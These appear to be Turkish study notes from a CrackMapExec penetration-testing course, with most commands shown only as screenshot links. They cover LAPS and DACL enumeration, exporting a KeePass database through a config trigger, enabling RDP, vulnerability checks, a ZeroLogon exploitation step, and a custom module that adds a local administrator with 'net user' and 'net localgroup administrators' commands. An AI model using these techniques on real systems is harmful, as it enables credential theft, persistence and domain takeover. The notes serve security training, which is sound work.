+Bir başka harika modül de laps . Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya parola sıfırlama talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için COMPUTER seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir joker karakterle birlikte kullanabiliriz.
+
+
+### LAPS Modülü Parolaların Alınması
+![Pasted image 20241203130705.png](/img/user/resimler/Pasted%20image%2020241203130705.png)
+
+![Pasted image 20241203130838.png](/img/user/resimler/Pasted%20image%2020241203130838.png)
+![Pasted image 20241203130844.png](/img/user/resimler/Pasted%20image%2020241203130844.png)
+
+Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır
+
+
+### LDAP Modülü - MAQ
+[MS-DS-Machine-AccountQuot](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)a özniteliği ile temsil edilen Machine Account Quota (MAQ), varsayılan olarak bir kullanıcının bir domain içinde oluşturmasına izin verilen bilgisayar hesaplarının sayısını gösteren domain düzeyinde bir özniteliktir.
+
+Domain'de bir makine oluşturmamızı gerektiren [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) gibi birkaç saldırı vardır ve bu nedenle hesap makinesi kotası özelliğini numaralandırmak çok önemlidir.
+
+
+### Machine Quota Module
+![Pasted image 20241203131107.png](/img/user/resimler/Pasted%20image%2020241203131107.png)
+
+
+### LDAP Module - daclread
+
+Bir başka harika modül ise bir veya birden fazla nesnenin DACL'lerini okumamızı ve dışa aktarmamızı sağlayan daclread'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:
+
+
+### daclread Module Options
+
+![Pasted image 20241203131203.png](/img/user/resimler/Pasted%20image%2020241203131203.png)
+
+Diyelim ki grace hesabının tüm ACE'lerini okumak istiyoruz. TARGET seçeneğini ve ACTION read seçeneğini kullanabiliriz:
+
+
+### Grace Kullanıcısının DACL'sini Oku
+
+![Pasted image 20241203131236.png](/img/user/resimler/Pasted%20image%2020241203131236.png)
+![Pasted image 20241203131242.png](/img/user/resimler/Pasted%20image%2020241203131242.png)
+
+
+Hangi sorumluların DCSync haklarına sahip olduğu gibi belirli hakları da arayabiliriz. TARGET_DN seçeneğini kullanmamız ve ayırt edici alan adını (DN), okunan ACTION'ı ve RIGHTS seçeneği ile aramak istediğimiz hakları belirtmemiz gerekir.
+
+
+### Searching for Users with DCSync Rights
+![Pasted image 20241203131416.png](/img/user/resimler/Pasted%20image%2020241203131416.png)
+![Pasted image 20241203131423.png](/img/user/resimler/Pasted%20image%2020241203131423.png)
+![Pasted image 20241203131432.png](/img/user/resimler/Pasted%20image%2020241203131432.png)
+
+Çıktıda gösterildiği gibi, ACE[4] robert kullanıcısının hedef domain'de DCSync haklarına sahip olduğunu gösterir.
+
+LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+### LDAP Protocol Modules
+
+![Pasted image 20241203131512.png](/img/user/resimler/Pasted%20image%2020241203131512.png)
+
+
+
+### SMB Protocol Modules
+SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.
+
+Not: SMB kullanan modüllerin çoğunun çalışması için yönetici haklarına ( Pwned! ) ihtiyaç vardır.
+
+
+### SMB Modülleri - get_netconnections ve ioxidresolver
+Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. get_netconnections ve ioxidresolver modüllerini kullanalım ve farklarını görelim.
+
+get_netconnections modülü, ağ bağlantılarını sorgulamak için WMI kullanır. IPv6 ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.
+
+
+### get_netconnections Module
+![Pasted image 20241203142100.png](/img/user/resimler/Pasted%20image%2020241203142100.png)
+
+
+Öte yandan, ioxidresolver modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül IPv6 adreslerini içermez.
+
+
+### ioxidresolver Module
+![Pasted image 20241203142142.png](/img/user/resimler/Pasted%20image%2020241203142142.png)
+![Pasted image 20241203142148.png](/img/user/resimler/Pasted%20image%2020241203142148.png)
+
+Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.
+
+
+### SMB Module - keepass_discover
+
+KeePass, kurumsal ağlarda yöneticiler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir parola yöneticisidir. Bir ana parola onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.
+
+### KeePass'i Keşfetme
+
+![Pasted image 20241203142341.png](/img/user/resimler/Pasted%20image%2020241203142341.png)
+
+Eğer ana parolaya sahip değilsek bir alternatif de Lee Christensen ( @tifkin_) ve Will Schroeder ( @harmj0y) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın tetikleme sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [tetikleyici](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.
+
+Bunu kullanmak için beş (5) adıma ihtiyacımız var:
+
+21. KeePass yapılandırma dosyasını bulun. Biz bunu keepass_discover modülü ile yaptık.
+22. ACTION=ADD seçeneğini ve KEEPASS_CONFIG_PATH öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.
+
+### KeePass Yapılandırma Dosyasına Trigger Ekleme
+![Pasted image 20241203142642.png](/img/user/resimler/Pasted%20image%2020241203142642.png)
+Not: KeePass yapılandırma yolu için ters eğik çizgi (/) veya çift eğik çizgi (\) kullandığınızdan emin olun.
+
+Kullanıcının KeePass'i açmasını ve ana parolayı girmesini bekleyin. Bu işlemi zorlamak için ACTION=RESTART seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, USER=julio gibi kullanıcı adı ile USER seçeneğini ekleyebiliriz.
+
+![Pasted image 20241203142812.png](/img/user/resimler/Pasted%20image%2020241203142812.png)
+
+ACTION=POLL seçeneğini kullanarak dışa aktarılan veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.
+
+
+### Ele Geçirilen Hedeften Dışa Aktarılan Verilerin Yoklanması
+![Pasted image 20241203142916.png](/img/user/resimler/Pasted%20image%2020241203142916.png)
+
+![Pasted image 20241203142924.png](/img/user/resimler/Pasted%20image%2020241203142924.png)
+
+ACTION=CLEAN seçeneğini ve KEEPASS_CONFIG_PATH'i kullanarak yapılandırma dosyasını temizleyin
+
+
+### Clean Configuration File Changes
+
+![Pasted image 20241203143132.png](/img/user/resimler/Pasted%20image%2020241203143132.png)
+![Pasted image 20241203143139.png](/img/user/resimler/Pasted%20image%2020241203143139.png)
+
+Bu modül için her bir seçeneği öğrendik, ancak ACTION=ALL ile hepsini bir kerede alabiliriz. Bu seçeneğin iyi yanı, .xml dosyasında herhangi bir parola girişi arayan ve bunu konsola yazdıran extract_password yöntemini içermesidir.
+
+
+### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma
+
+![Pasted image 20241203143219.png](/img/user/resimler/Pasted%20image%2020241203143219.png)
+![Pasted image 20241203143229.png](/img/user/resimler/Pasted%20image%2020241203143229.png)
+Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre /tmp/export.xml dosyasında olacaktır, böylece manuel olarak alabiliriz.
+
+
+### RDP'yi Etkinleştirme veya Devre Dışı Bırakma
+Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü yanal hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.
+
+Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. ACTION seçeneğini ve ardından enable veya disable seçeneklerini belirtmemiz gerekir.
+
+
+### RDP'yi Etkinleştirme
+![Pasted image 20241203143718.png](/img/user/resimler/Pasted%20image%2020241203143718.png)
+![Pasted image 20241203143723.png](/img/user/resimler/Pasted%20image%2020241203143723.png)
+
+SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+
+### SMB Protocol Modules
+![Pasted image 20241203143808.png](/img/user/resimler/Pasted%20image%2020241203143808.png)
+
+Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız
+
+
+### Vulnerability Scan Modules
+Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.
+
+CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.
+
+
+### Ortamın Kurulması
+Bu senaryoda, bir sunucuyu ele geçirdik ve yönetici kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi 172.16.10.3'tür.
+
+Alana erişim sağlamak için, CME ile Proxy Zincirleri bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız
+
+
+### Chisel'i Hedef Makineye Gönderme
+![Pasted image 20241203144114.png](/img/user/resimler/Pasted%20image%2020241203144114.png)
+
+
+### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma
+![Pasted image 20241203144152.png](/img/user/resimler/Pasted%20image%2020241203144152.png)
+![Pasted image 20241203144157.png](/img/user/resimler/Pasted%20image%2020241203144157.png)
+
+
+### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama
+
+![Pasted image 20241203144219.png](/img/user/resimler/Pasted%20image%2020241203144219.png)
+
+
+### Vulnerability Scan Modules
+
+CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.
+
+
+### ZeroLogon
+Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in kontrolünü ele geçirmek için savunmasız bir Netlogon oturumu başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.
+
+CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.
+
+
+### ZeroLogon Güvenlik Açığı Kontrolü
+![Pasted image 20241203144642.png](/img/user/resimler/Pasted%20image%2020241203144642.png)
+
+
+### PetitPotam
+Güvenlik araştırmacısı Gilles Lionel kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu hizmetine (örneğin bir Domain Controller) yönelik klasik bir NTLM relay saldırısıdır. Lionel ayrıca GitHub PetitPotam'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir kavram kanıtı kodu da yayınladı.
+
+CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan petitpotam adlı bir modül içerir.
+
+
+### Petitpotam Güvenlik Açığı Kontrolü
+![Pasted image 20241203144823.png](/img/user/resimler/Pasted%20image%2020241203144823.png)
+
+
+### noPAC
+noPAC güvenlik açığının istismarı, normal bir domain kullanıcısının ayrıcalıklarının bir domain yöneticisine yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.
+
+CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.
+
+
+### noPAC vulnerability check
+![Pasted image 20241203144947.png](/img/user/resimler/Pasted%20image%2020241203144947.png)
+![Pasted image 20241203144952.png](/img/user/resimler/Pasted%20image%2020241203144952.png)
+
+
+### DFSCoerce
+Filip Dragovic, DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin kontrolünü ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.
+
+Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü dfscoerce'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için Y3t4n0th3rP4ssw0rd şifresiyle carole.holmes hesabını kullanacağız.
+
+
+### DFSCoerce Vulnerability Check
+![Pasted image 20241203145115.png](/img/user/resimler/Pasted%20image%2020241203145115.png)
+
+
+### ShadowCoerce
+ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. Charlie Bromberg bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.
+
+CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.
+
+
+### ShadowCoerce Vulnerability Check
+![Pasted image 20241203145402.png](/img/user/resimler/Pasted%20image%2020241203145402.png)
+![Pasted image 20241203145408.png](/img/user/resimler/Pasted%20image%2020241203145408.png)
+
+Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( ./CrackMapExec/cme/modules/shadowcoerce.py) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( logging.debug ) ile bazı hata ayıklama günlükleri eklediğini göreceğiz. CrackMapExec'i hata ayıklama modunda çalıştırırsak, bu günlükleri yazdıracaktır.
+
+CrackMapExec'i hata ayıklama modunda çalıştırmak için protokolden önce --verbose seçeneğini kullanabiliriz
+
+
+### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma
+![Pasted image 20241203145516.png](/img/user/resimler/Pasted%20image%2020241203145516.png)
+![Pasted image 20241203145527.png](/img/user/resimler/Pasted%20image%2020241203145527.png)
+![Pasted image 20241203145547.png](/img/user/resimler/Pasted%20image%2020241203145547.png)
+![Pasted image 20241203145555.png](/img/user/resimler/Pasted%20image%2020241203145555.png)
+![Pasted image 20241203145602.png](/img/user/resimler/Pasted%20image%2020241203145602.png)
+
+DEBUG ile başlayan satırlar logging.debug'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.
+
+
+### MS17-010 (EternalBlue)
+MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB hizmetindeki kritik bir kimliği doğrulanmamış uzaktan kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.
+
+CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.
+
+
+### MS17-010 Vulnerability Check
+![Pasted image 20241203145753.png](/img/user/resimler/Pasted%20image%2020241203145753.png)
+
+
+### Güvenlik Açığından Yararlanma
+Birçok güvenlik açığı gördük. Onlardan birini istismar etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:
+
+
+### Exploiting ZeroLogon
+
+![Pasted image 20241203145855.png](/img/user/resimler/Pasted%20image%2020241203145855.png)
+
+![Pasted image 20241203145911.png](/img/user/resimler/Pasted%20image%2020241203145911.png)
+![Pasted image 20241203145928.png](/img/user/resimler/Pasted%20image%2020241203145928.png)
+![Pasted image 20241203145952.png](/img/user/resimler/Pasted%20image%2020241203145952.png)
+
+Diğer güvenlik açıklarından da yararlanmayı deneyebiliriz, ancak yararlanmadan önce hedef makineyi sıfırlamamız gerekir.
+
+Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.
+
+
+### Kendi CME Modülümüzü Oluşturmak
+Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.
+
+
+### CrackMapExec'i Poetry ile derleyin
+Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın
+
+Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).
+
+
+### VSCode'un Kurulması ve Çalıştırılması
+![Pasted image 20241203150414.png](/img/user/resimler/Pasted%20image%2020241203150414.png)
+
+Daha sonra açmak için kod yazabiliriz 
+
+![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)
+
+
+### Yeni Modülümüzü Oluşturun
+Modülümüzü oluşturalım. Yeni bir yönetici hesabı oluşturacak basit bir script oluşturacağız.
+23. ./CrackMapExec/cme/modules klasörü altında createadmin.py adında bir dosya oluşturun.
+24. Aşağıdaki kod örneğini dosyaya kopyalayın:
+
+![Pasted image 20241203150546.png](/img/user/resimler/Pasted%20image%2020241203150546.png)
+![Pasted image 20241203150551.png](/img/user/resimler/Pasted%20image%2020241203150551.png)
+
+25. Şimdi modülümüzü özelleştirelim.
+
+Bazı değişkenleri tanımlamamız gerekiyor:
+* name, modül adını nasıl çağıracağımızı belirtir. Bu durumda, createadmin dosya adını kullanacağız.
+* description modülün amacı için kısa bir açıklamadır. Biz bunu Yeni bir yönetici hesabı oluştur olarak ayarlayacağız.
+* supported_protocols, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece SMB kullanacağız.
+* opsec_safe, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir True veya False değeridir.
+* multiple_hosts, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.
+
+Ayrıca, modül için değişkenleri tanımlamak için kullanılan options() yöntemine de sahip olacağız. Bu durumda, USER ve PASS olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri HackTheBoxCME! . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.
+
+![Pasted image 20241203150803.png](/img/user/resimler/Pasted%20image%2020241203150803.png)
+![Pasted image 20241203150814.png](/img/user/resimler/Pasted%20image%2020241203150814.png)
+
+26. Daha sonra, on_admin_login() metodunu kullanarak yürütme ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak context.log.info ve context.log.highlight metotlarını kullanacağız (farklı renklere sahipler).
+
+Bu yürütme için, yöntemin connection.execute(command, True) komutunu kullanarak bir cmd.exe komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için net user username password /add /Y değeriyle ve kullanıcıyı administrators grubuna eklemek için net localgroup administrators username /add değeriyle command değişkenine kaydedilecektir.
+
+![Pasted image 20241203150911.png](/img/user/resimler/Pasted%20image%2020241203150911.png)
+![Pasted image 20241203150916.png](/img/user/resimler/Pasted%20image%2020241203150916.png)
+
+Son olarak, yeni modülümüz şu şekilde görünmelidir:
+![Pasted image 20241203150932.png](/img/user/resimler/Pasted%20image%2020241203150932.png)
+![Pasted image 20241203151010.png](/img/user/resimler/Pasted%20image%2020241203151010.png)
+![Pasted image 20241203151027.png](/img/user/resimler/Pasted%20image%2020241203151027.png)
+
+
+### Modülümüzü Çalıştırma
+Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.
+
+
+### CME Modülümüzün Çalıştırılması createadmin
+![Pasted image 20241203151110.png](/img/user/resimler/Pasted%20image%2020241203151110.png)
+
+Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.
+
+![Pasted image 20241203151145.png](/img/user/resimler/Pasted%20image%2020241203151145.png)
+![Pasted image 20241203151149.png](/img/user/resimler/Pasted%20image%2020241203151149.png)
+
+İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.
+
+Ayrıca context.log.highlight(p)'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?
+
+Bir şeyleri yapmanın her zaman farklı yolları olacaktır. Bu modülde neleri değiştireceğinizi ve bunu nasıl daha iyi yapacağınızı keşfedin. Bu modülü daha da özelleştirmek, kendi modüllerinizi oluşturmaya başlamak için harika bir yerdir.
+
+
+### Diğer Yazarlardan Öğrenmek
+Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.
+
+Örneğin, procdump.py modülü procdump.exe çalıştırılabilir dosyasını bir Base64 dizesi olarak kaydeder, ardından Base64 dizesini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için tasklist komutunu çalıştırır, bunu bir değişkene kaydeder ve işlem kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.
+
+Başka bir örnek get_description.py . Bu modülü groupmembership modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve memberOf özniteliğini almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir çekme isteği gönderdik. Çekme isteği kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.
+
+Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.
+
+
+### Çekme İsteği Oluşturma
+CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir çekme isteği ekleyerek projeye katkıda bulunabiliriz.
+
+Bir çekme isteği yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.
+
+İlerleyen bölümlerde, CrackMapExec kullanımı için IPv6, Kerberos Kimlik Doğrulama ve CrackMapExec veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.
+
+
+
+### Ek CME İşlevselliği
+CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:
+
+* Audit (Denetim) modu
+* IPv6 desteği
+* Birden fazla cihaza saldırırken tamamlanma yüzdesi
+
+### Audit Mode
+
+5.3.0 sürümünde yeni bir mod eklendi: audit modu. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz emoji ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.
+
+Audit modunu yapılandırmak için, varsayılan olarak ~/.cme/cme.conf adresinde bulunan yapılandırma dosyasını düzenlememiz ve audit_mode parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için # karakterini kullanacağız
+
+
+### Enabling Audit Mode
+
+![Pasted image 20241203151754.png](/img/user/resimler/Pasted%20image%2020241203151754.png)
+
+Şimdi çalıştırabilir ve parolanın çıktıda ######## ile değiştirildiğini görebiliriz.
+
+![Pasted image 20241203151816.png](/img/user/resimler/Pasted%20image%2020241203151816.png)
+
+Gördüğümüz gibi, çalıştırma sonucundaki parola # karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.
+
+### Denetim Modu Dosyadaki Parola ile Etkinleştirildi
+![Pasted image 20241203151858.png](/img/user/resimler/Pasted%20image%2020241203151858.png)
+
+
+### IPv6 Support
+CrackMapExec'in bir diğer özelliği de IPv6 üzerinden iletişimi desteklemesidir. Çoğu kuruluş, kullanmasalar bile IPv6'yı varsayılan olarak etkinleştirmiştir ve IPv6'nın IPv4'e göre günlük düzeyinde daha az izlenmesi veya anlaşılması bile mümkündür. Bu da ağ saldırılarının gerçekleştirilmesi ve tespit edilmemesi için bir fırsat yaratmaktadır.
+
+Popüler modüller bölümünde gördüğümüz gibi CrackMapExec get_netconnections modülü ile bilgisayarların IPv6'sını tespit etmemizi sağlıyor. Bu modülü kullanalım ve ardından komutu IPv6 üzerinden çalıştırmayı deneyelim.
+
+
+### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma
+
+![Pasted image 20241203152004.png](/img/user/resimler/Pasted%20image%2020241203152004.png)
+![Pasted image 20241203152012.png](/img/user/resimler/Pasted%20image%2020241203152012.png)
+
+Şimdi IPv6 üzerinden hedefe erişelim.
+![Pasted image 20241203152032.png](/img/user/resimler/Pasted%20image%2020241203152032.png)
+![Pasted image 20241203152041.png](/img/user/resimler/Pasted%20image%2020241203152041.png)
+![Pasted image 20241203152051.png](/img/user/resimler/Pasted%20image%2020241203152051.png)
+
+
+
+### Tamamlanma Yüzdesi
+
+Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik --shares seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.
+
+
+### Tamamlanma Yüzdesi
+![Pasted image 20241203152158.png](/img/user/resimler/Pasted%20image%2020241203152158.png)
+
+Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.
+
+
+### Kerberos Authentication
+
+Yazma sırasında CrackMapEec, SMB, LDAP ve MSSQL protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:
+
+27. ccache dosyasını belirtmek için KRB5CCNAME env adını kullanma. Password Attacks academy modülündeki Pass the Ticket (PtT) from Linux bölümünde Linux'tan Kerberos kullanımı anlatılmaktadır
+28. CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir biletle KRB5CCNAME ortam değişkenini kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.
+
+Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin FQDN'sini çözümlemesi gerektiğidir. Dahili bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve /etc/hosts dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.
+
+
+### Setting Up the /etc/hosts File
+
+![Pasted image 20241203152738.png](/img/user/resimler/Pasted%20image%2020241203152738.png)
+
+![Pasted image 20241203152745.png](/img/user/resimler/Pasted%20image%2020241203152745.png)
+
+CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.
+
+
+### Username and Password - Kerberos Authentication
